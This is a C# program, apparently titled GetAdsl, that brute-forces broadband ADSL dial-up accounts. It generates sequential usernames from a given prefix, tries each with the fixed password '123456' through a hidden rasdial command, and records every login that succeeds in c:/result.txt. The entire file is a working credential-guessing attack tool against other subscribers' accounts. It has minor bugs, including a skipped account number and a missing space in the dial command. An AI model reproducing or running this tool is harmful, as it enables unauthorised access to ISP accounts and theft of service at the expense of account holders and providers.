using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.IO;

namespace GetAdsl
{
    class Wklist
    {
        public static string ExitAdsl = "rasdial  /disconnect";
        public List<wkSimple> list = new List<wkSimple>();
        public List<wkSimple> result = new List<wkSimple>();
        public string cmd = "rasdial";
        public string Adsl;
        public string head;
        public string password = "123456";
        public Wklist(string adsl, string head) 
        {
            this.Adsl = adsl;
            this.head = head;
            for (int i = 1; i < 9999; i++)
            {
                if (i < 10)
                    list.Add(new wkSimple(head + "000" + i.ToString(),password));
                if (i >= 10 && i < 100)
                    list.Add(new wkSimple(head + "00" + i.ToString(), password));
                if (i >= 100 & i < 1000)
                    list.Add(new wkSimple(head + "0" + i.ToString(),password));
                if (i > 1000)
                    list.Add(new wkSimple(head + i.ToString(), password));
            }
        }
        public void Run()//运行
        {
            foreach (wkSimple each in this.list) 
            {
                string eachcmd = this.cmd+Adsl+" "+ each.Getuser()+" "+each.Getpassword();
                string[] cmd1 = new string[] { eachcmd };
                string Out = Cmd(cmd1);
                Console.WriteLine(Out);
                if (Out.Contains("注册")) 
                {
                    write(each, Out);
                }
                if (Out.Contains("您已经连接到"))
                {
                    exitadsl(Out);
                     string[] cmdexit = new string[] { "rasdial "+Adsl+" /disconnect" };
                    exitadsl(Cmd(cmdexit));//退出
                }
            }
        }
        private static void exitadsl(string Out)//退出
        {
            using (StreamWriter sw = File.AppendText(@"c:/result.txt"))
            {
                sw.WriteLine(DateTime.Now.ToString());
                sw.WriteLine(Out);
                sw.WriteLine("==============");
            }
        }
        private static void write(wkSimple each, string Out)//写入
        {
            using (StreamWriter sw = File.AppendText(@"c:/result.txt"))
            {
                sw.WriteLine(DateTime.Now.ToString());
                sw.WriteLine(Out);
                sw.WriteLine(each.Getuser());
                sw.WriteLine("------------------");
            }
        }
        public static string Cmd(string[] cmd)
        {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();
            p.StandardInput.AutoFlush = true;
            for (int i = 0; i < cmd.Length; i++)
            {
                p.StandardInput.WriteLine(cmd[i].ToString());
            }
            p.StandardInput.WriteLine("exit");
            string strRst = p.StandardOutput.ReadToEnd();
            p.WaitForExit();
            p.Close();
            return strRst;
        }
        public static bool CloseProcess(string ProcName)
        {
            bool result = false;
            System.Collections.ArrayList procList = new System.Collections.ArrayList();
            string tempName = "";
            int begpos;
            int endpos;
            foreach (System.Diagnostics.Process thisProc in System.Diagnostics.Process.GetProcesses())
            {
                tempName = thisProc.ToString();
                begpos = tempName.IndexOf("(") + 1;
                endpos = tempName.IndexOf(")");
                tempName = tempName.Substring(begpos, endpos - begpos);
                procList.Add(tempName);
                if (tempName == ProcName)
                {
                    if (!thisProc.CloseMainWindow())
                        thisProc.Kill(); // 当发送关闭窗口命令无效时强行结束进程
                    result = true;
                }
            }
            return result;
        }
    }
}
